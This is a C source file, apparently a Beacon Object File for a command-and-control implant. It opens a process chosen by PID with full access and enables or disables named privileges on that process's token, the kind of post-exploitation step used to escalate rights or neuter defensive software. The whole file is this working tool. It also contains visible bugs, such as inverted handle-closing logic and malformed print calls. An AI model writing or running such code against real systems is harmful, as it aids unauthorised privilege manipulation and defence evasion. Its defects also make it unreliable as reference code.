#include <windows.h>
#include "beacon.h"

WINADVAPI WINBOOL WINAPI ADVAPI32$OpenProcessToken (HANDLE ProcessHandle, DWORD DesiredAccess, PHANDLE TokenHandle);
WINBASEAPI HANDLE WINAPI KERNEL32$OpenProcess(DWORD,WINBOOL,DWORD);
WINADVAPI WINBOOL WINAPI ADVAPI32$LookupPrivilegeValueA(LPCSTR,LPCSTR,PLUID);
WINADVAPI WINBOOL WINAPI ADVAPI32$AdjustTokenPrivileges(HANDLE,WINBOOL,PTOKEN_PRIVILEGES,DWORD,PTOKEN_PRIVILEGES,PDWORD);
DECLSPEC_IMPORT char * __cdecl MSVCRT$strtok(char *,char *);
DECLSPEC_IMPORT int  __cdecl MSVCRT$strcmp(char *,char *);
WINBASEAPI DWORD WINAPI KERNEL32$GetLastError(VOID);
WINBASEAPI HANDLE WINAPI KERNEL32$CloseHandle(HANDLE);



void go(char * args,int len){


 datap parser;
 BeaconDataParse(&parser,args,len);

LUID luid = {0};
TOKEN_PRIVILEGES tokprivs = {0};
CHAR * priv = NULL;
CHAR * toggle = NULL;
CHAR  * delim = ",";
CHAR * strtoken = NULL;
BOOL status;
HANDLE hProc = NULL;
HANDLE hToken = NULL;
int pid = 0;

toggle =(char *)BeaconDataExtract(&parser,NULL);
priv =(char *)BeaconDataExtract(&parser,NULL);
pid = BeaconDataInt(&parser);

strtoken = MSVCRT$strtok(priv,delim);

while(strtoken != NULL){

    BeaconPrintf(CALLBACK_OUTPUT,"[+]Privilege Value being applied %s\n",strtoken);

     hProc = KERNEL32$OpenProcess(PROCESS_ALL_ACCESS,FALSE,pid);
     if(hProc == NULL){
        BeaconPrintf(CALLBACK_OUTPUT,CALLBACK_OUTPUT,"OpenProcess failed with %d\n",KERNEL32$GetLastError());
        goto cleanup;
     }


     status = ADVAPI32$OpenProcessToken(hProc,TOKEN_ALL_ACCESS,&hToken);
     if(!status){
       BeaconPrintf(CALLBACK_OUTPUT,CALLBACK_OUTPUT,"OpenProcessToken Failed with %d\n",KERNEL32$GetLastError());
       goto cleanup;
      }


     status = ADVAPI32$LookupPrivilegeValueA(NULL,strtoken,&luid);
     if(!status){
       BeaconPrintf(CALLBACK_OUTPUT,CALLBACK_OUTPUT,"LookupPrivilegeValueA Failed with %d\n",KERNEL32$GetLastError());
       goto cleanup;
     }

     tokprivs.PrivilegeCount = 1;
     tokprivs.Privileges[0].Luid = luid;
     if(toggle != NULL){
        if(MSVCRT$strcmp(toggle,"enable") == 0){
            tokprivs.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
            BeaconPrintf(CALLBACK_OUTPUT,"[+]Enabling Privileges in Desired Process");
        }
        else if(MSVCRT$strcmp(toggle,"disable") == 0){
            tokprivs.Privileges[0].Attributes = 0;
            BeaconPrintf(CALLBACK_OUTPUT,"[+]Disabling Privileges in Desired Process");
        }
     }

     status = ADVAPI32$AdjustTokenPrivileges(hToken,FALSE,&tokprivs,sizeof(tokprivs),NULL,NULL);
     if(!status){
       BeaconPrintf(CALLBACK_OUTPUT,CALLBACK_OUTPUT,"AdjustTokenPrivileges Failed with %d\n",KERNEL32$GetLastError());
       goto cleanup;
     }

     BeaconPrintf(CALLBACK_OUTPUT,"[+]%s Token Operation Successfully applied in Process %d\n",strtoken,pid);

     strtoken = MSVCRT$strtok(NULL,delim);


}

goto cleanup;



cleanup:
    if(hProc == NULL){
        KERNEL32$CloseHandle(hProc);
    }
    if(hToken == NULL){
        KERNEL32$CloseHandle(hToken);
    }





}
